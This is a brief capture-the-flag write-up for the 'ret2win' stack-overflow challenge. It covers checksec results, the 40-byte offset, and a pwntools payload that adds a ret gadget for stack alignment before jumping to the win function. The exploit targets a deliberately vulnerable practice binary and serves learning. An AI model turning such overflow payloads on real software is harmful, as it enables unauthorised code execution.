# ret2win

From reading the information on the website and running the program, we have the following information:
- The program will read 52 bytes of data into a 32 byte buffer
- There is a `ret2win` function we want to jump to

Other relevant information found via `checksec` is:
- There are no canaries
- PIE is not enabled
- NX is enabled

With this information, my approach is to:
1. Determine the offset of the return address on the stack
2. Replace it with the address of `ret2win`

First thing I did was create my exploit script with `pwn template ./ret2win > xpl.py`. The description says we will need 40 bytes of garbage,  so I put the following in my script:
```python
ret = 0x40053e # address to ret gadget found via ropper --file ret2win

payload = b'A' * 40
payload += p64(ret)
payload += p64(exe.sym['ret2win'])

io.sendline(payload)
```

Note that I added a `ret` before the address of `ret2win`, this is to mitigate a stack alignment issue.
